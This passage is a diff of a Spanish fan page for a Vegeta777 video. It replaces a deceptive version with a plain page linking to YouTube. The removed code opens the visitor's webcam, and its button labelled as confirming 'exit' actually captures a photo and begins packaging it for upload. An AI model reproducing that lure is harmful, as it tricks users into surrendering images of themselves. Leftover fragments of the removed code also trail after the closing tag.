@@ -1,225 +1,94 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>VEGETA777 🔥</title>
+
     <meta property="og:title" content="VEGETA777 🔥">
-<meta property="og:description" content="Mira el vídeo de Vegeta777">
-<meta property="og:image" content="https://img.youtube.com/vi/KSkzS7NNecU/hqdefault.jpg">
-<meta property="og:type" content="website">
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Vídeos y multimedia</title>
+    <meta property="og:description" content="Mira el vídeo de Vegeta777">
+    <meta property="og:image"
+          content="https://img.youtube.com/vi/KSkzS7NNecU/hqdefault.jpg">
+    <meta property="og:type" content="website">
 
-<style>
-* { box-sizing: border-box; }
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-body {
-    margin: 0;
-    padding: 20px;
-    background: #f4f6fa;
-    color: #202938;
-    font-family: Arial, sans-serif;
-}
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #10131c;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
 
-header {
-    background: white;
-    padding: 22px;
-    text-align: center;
-    border-bottom: 1px solid #e5e8ef;
-}
+        main {
+            max-width: 650px;
+            margin: 40px auto;
+            text-align: center;
+        }
 
-header h1 {
-    margin: 0;
-    font-size: 23px;
-}
+        .card {
+            background: #1c2230;
+            padding: 24px;
+            border-radius: 16px;
+        }
 
-main {
-    max-width: 600px;
-    margin: 30px auto;
-}
+        h1 {
+            color: #ffb52e;
+        }
 
-.card {
-    background: white;
-    padding: 24px;
-    border-radius: 14px;
-    margin-bottom: 20px;
-    box-shadow: 0 3px 15px #00000008;
-}
+        p {
+            color: #c5cad5;
+            line-height: 1.6;
+        }
 
-h2 { font-size: 20px; }
+        .thumbnail {
+            display: block;
+            width: 100%;
+            border-radius: 12px;
+        }
 
-p {
-    color: #667085;
-    line-height: 1.5;
-}
-
-button {
-    width: 100%;
-    padding: 14px;
-    margin-top: 10px;
-    border: 0;
-    border-radius: 9px;
-    background: #2463eb;
-    color: white;
-    font-size: 15px;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-.secondary {
-    background: #e9edf5;
-    color: #263247;
-}
-
-video, iframe {
-    width: 100%;
-    border: 0;
-    border-radius: 10px;
-}
-
-[hidden] { display: none !important; }
-
-#status {
-    text-align: center;
-    font-size: 14px;
-}
-
-</style>
+        a {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            background: #e62117;
+            color: white;
+            font-weight: bold;
+            text-decoration: none;
+        }
+    </style>
 </head>
 
 <body>
+    <main>
+        <section class="card">
+            <h1>VEGETA777 🔥</h1>
 
-<header>
-    <h1>Vídeos y multimedia</h1>
-</header>
+            <p>
+                ¡Disfruta del vídeo de Vegeta777!
+            </p>
 
-<main>
+            <img
+                class="thumbnail"
+                src="https://img.youtube.com/vi/KSkzS7NNecU/hqdefault.jpg"
+                alt="Miniatura del vídeo de Vegeta777">
 
-<section class="card" id="consentSection">
-
-    <button id="yes">SÍ, CONTINUAR</button>
-    <button id="no" class="secondary">NO, CANCELAR</button>
-</section>
-
-<section class="card" id="cameraSection" hidden>
-    <h2>Cámara</h2>
-
-    <video id="camera" autoplay muted playsinline></video>
-
-    <button id="stopCamera" class="secondary">
-        Apagar cámara
-    </button>
-</section>
-
-<section class="card" id="videoSection" hidden>
-    <h2>Vídeo de Vegeta777</h2>
-
-    <iframe
-        src="https://www.youtube-nocookie.com/embed/KSkzS7NNecU"
-        title="Vídeo de Vegeta777"
-        allow="encrypted-media; picture-in-picture"
-        allowfullscreen>
-    </iframe>
-</section>
-
-<section class="card" id="photoSection" hidden>
-    <h2>SALIDA</h2>
-
-    <p>
-        ¿Confirmas que quieres salir?
-    </p>
-
-    <button id="sendPhoto">SÍ, salir</button>
-    <button id="cancelPhoto" class="secondary">NO, CANCELAR</button>
-</section>
-
-<p id="status" role="status"></p>
-
-</main>
-
-<script>
-const consentSection = document.getElementById("consentSection");
-const cameraSection = document.getElementById("cameraSection");
-const videoSection = document.getElementById("videoSection");
-const photoSection = document.getElementById("photoSection");
-
-const camera = document.getElementById("camera");
-const status = document.getElementById("status");
-
-let stream = null;
-
-function stopCamera() {
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-    }
-
-    camera.srcObject = null;
-    cameraSection.hidden = true;
-}
-
-document.getElementById("yes").addEventListener("click", async () => {
-    try {
-        if (!navigator.mediaDevices?.getUserMedia) {
-            throw new Error("Se necesita HTTPS para utilizar la cámara.");
-        }
-
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: false
-        });
-
-        camera.srcObject = stream;
-        await camera.play();
-
-        consentSection.hidden = true;
-        cameraSection.hidden = false;
-        videoSection.hidden = false;
-        photoSection.hidden = false;
-
-        status.textContent = "";
-
-    } catch (error) {
-        stopCamera();
-        status.textContent = "No se pudo activar la cámara: " + error.message;
-    }
-});
-
-document.getElementById("no").addEventListener("click", () => {
-    consentSection.hidden = true;
-    status.textContent = "Has cancelado.";
-});
-
-document.getElementById("stopCamera").addEventListener("click", () => {
-    stopCamera();
-    photoSection.hidden = true;
-    status.textContent = "Cámara apagada.";
-});
-
-document.getElementById("cancelPhoto").addEventListener("click", () => {
-    photoSection.hidden = true;
-    status.textContent = "Envío cancelado.";
-});
-
-document.getElementById("sendPhoto").addEventListener("click", async () => {
-    if (!stream || !camera.videoWidth) {
-        status.textContent = "La cámara no está activa.";
-        return;
-    }
-
-    const button = document.getElementById("sendPhoto");
-    button.disabled = true;
-
-    try {
-        const canvas = document.createElement("canvas");
-        canvas.width = camera.videoWidth;
-        canvas.height = camera.videoHeight;
-
-        canvas.getContext("2d").drawImage(camera, 0, 0);
-
-        const blob = await new Promise(resolve =>
-            canvas.toBlob(resolve, "image/jpeg", 0.9)
-        );
-
+            <a
+                href="https://www.youtube.com/watch?v=KSkzS7NNecU"
+                target="_blank"
+                rel="noopener noreferrer">
+                ▶ VER VÍDEO EN YOUTUBE
+            </a>
+        </section>
+    </main>
+</body>
+</html>
         if (!blob) throw new Error("No se pudo crear la fotografía.");
 
         const data = new FormData();
